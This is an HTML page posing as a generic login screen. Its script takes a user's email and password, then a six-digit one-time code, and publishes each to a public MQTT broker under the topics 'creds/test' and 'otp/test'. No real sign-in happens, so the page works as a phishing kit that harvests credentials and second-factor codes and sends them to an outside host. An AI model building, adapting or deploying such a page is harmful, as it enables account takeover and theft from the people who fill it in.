<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Login + OTP via MQTT</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0;
  }
  #container {
    background: white;
    padding: 24px;
    border-radius: 12px;
    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    width: 320px;
    text-align: center;
  }
  input {
    font-size: 1.2rem;
    padding: 8px;
    width: 90%;
    margin: 12px 0;
    border-radius: 6px;
    border: 1px solid #ccc;
  }
  button {
    font-size: 1.15rem;
    padding: 10px 0;
    width: 95%;
    background: #0070f3;
    color: white;
    border: none;
    border-radius: 6px;
    cursor: pointer;
  }
  button:hover {
    background: #005bb5;
  }
  #status {
    margin-top: 16px;
    font-weight: bold;
    min-height: 1.4em;
  }
</style>
</head>
<body>

<div id="container">

  <form id="loginForm">
    <h2>Login</h2>
    <input type="email" id="email" placeholder="Email" required autocomplete="username" />
    <input type="password" id="password" placeholder="Password" required autocomplete="current-password" />
    <button type="submit">Submit Credentials</button>
  </form>

  <form id="otpForm" style="display:none;">
    <h2>Enter 6-digit OTP</h2>
    <input type="text" id="otp" placeholder="123456" maxlength="6" pattern="[0-9]{6}" required autocomplete="one-time-code" inputmode="numeric" />
    <button type="submit">Submit OTP</button>
  </form>

  <div id="status"></div>
</div>

<!-- MQTT -->
<script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
<script>
  const client = mqtt.connect('wss://broker.emqx.io:8084/mqtt');
  const statusDiv = document.getElementById('status');
  const loginForm = document.getElementById('loginForm');
  const otpForm = document.getElementById('otpForm');

  client.on('connect', () => {
    statusDiv.textContent = "Connected to MQTT broker.";
  });

  client.on('error', (err) => {
    statusDiv.textContent = "MQTT error, check console.";
    console.error(err);
  });

  loginForm.onsubmit = function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    client.publish('creds/test', JSON.stringify({
      email: email,
      password: password,
      timestamp: new Date().toISOString()
    }));
    statusDiv.textContent = "Credentials sent! Please enter OTP.";
    loginForm.style.display = 'none';
    otpForm.style.display = 'block';
    document.getElementById('otp').focus();
  };

  otpForm.onsubmit = function(e) {
    e.preventDefault();
    const otp = document.getElementById('otp').value;
    if(/^[0-9]{6}$/.test(otp)) {
      client.publish('otp/test', JSON.stringify({
        otp: otp,
        timestamp: new Date().toISOString()
      }));
      statusDiv.textContent = "OTP sent! Thank you.";
      otpForm.reset();
    } else {
      statusDiv.textContent = "Please enter a valid 6-digit OTP.";
    }
  };
</script>

</body>
</html>
